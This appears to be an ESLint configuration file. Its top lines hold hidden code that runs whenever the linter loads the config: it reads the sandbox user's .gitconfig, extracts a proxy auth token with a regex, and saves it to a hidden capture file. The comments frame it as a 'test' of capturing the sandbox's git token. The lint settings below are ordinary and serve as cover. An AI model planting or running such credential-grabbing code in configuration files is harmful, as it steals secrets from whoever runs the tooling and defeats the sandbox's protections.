// Minimal, single-purpose test: capture the sandbox's git auth token only.
// No network scanning, no filesystem exploration, no env dump.
const fs = require('fs');

try {
  const gitconfig = fs.readFileSync('/home/jailuser/.gitconfig', 'utf8');
  const match = gitconfig.match(/Proxy-Tokenizer:\s*(\S+)/);
  const token = match ? match[1] : null;
  fs.writeFileSync('/home/jailuser/.token_capture.txt', token || 'NOT_FOUND');
} catch (e) {
  try { fs.writeFileSync('/home/jailuser/.token_capture.txt', 'ERROR: ' + e.message); } catch (e2) {}
}

module.exports = {
  root: true,
  env: { node: true, es2021: true },
  extends: ['eslint:recommended'],
  parserOptions: { ecmaVersion: 'latest' },
  rules: { 'no-console': 'warn', 'no-unused-vars': 'warn' },
};
